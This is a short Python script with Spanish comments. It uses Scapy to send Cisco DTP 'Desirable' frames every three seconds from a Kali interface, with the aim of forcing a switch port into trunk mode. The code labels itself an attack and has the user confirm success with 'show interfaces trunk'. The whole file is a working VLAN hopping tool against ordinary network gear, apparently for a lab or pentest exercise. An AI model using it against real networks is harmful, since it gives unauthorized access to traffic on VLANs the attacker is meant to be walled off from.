#!/usr/bin/env python3
import time
from scapy.all import *

# Cargar la contribución de DTP de Scapy
load_contrib("dtp")

def dtp_spoofing(interface):
    print(f"[*] Iniciando negociación DTP en la interfaz {interface}...")
    print("[*] Enviando paquetes DTP 'Desirable' cada 3 segundos.")
    print("[*] Revisa el comando 'show interfaces trunk' en tu Switch Cisco...")
    
    # Dirección MAC multicast destino utilizada por DTP
    dtp_mac_dst = "01:00:0c:cc:cc:cc"
    mac_src = get_if_hwaddr(interface)
    
    # Construcción de la trama de negociación DTP
    packet = (
        Ether(dst=dtp_mac_dst, src=mac_src) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
        SNAP(OUI=0x00000c, code=0x2004) /
        DTP(tlvlist=[
            DTPDomain(domain=b'\x00'),               # Dominio por defecto/vacío
            DTPStatus(status=b'\x03'),               # 0x03 indica estado "Desirable"
            DTPType(dtptype=b'\x01'),
            DTPNeighbor(neighbor=mac_src)
        ])
    )
    
    try:
        while True:
            sendp(packet, iface=interface, verbose=False)
            print(f"[+] Trama DTP Desirable enviada desde {mac_src}")
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n[*] Ataque DTP detenido por el usuario.")

if __name__ == "__main__":
    # Cambia "eth0" por la interfaz correcta de tu Kali
    INTERFACE = "eth0" 
    dtp_spoofing(INTERFACE)
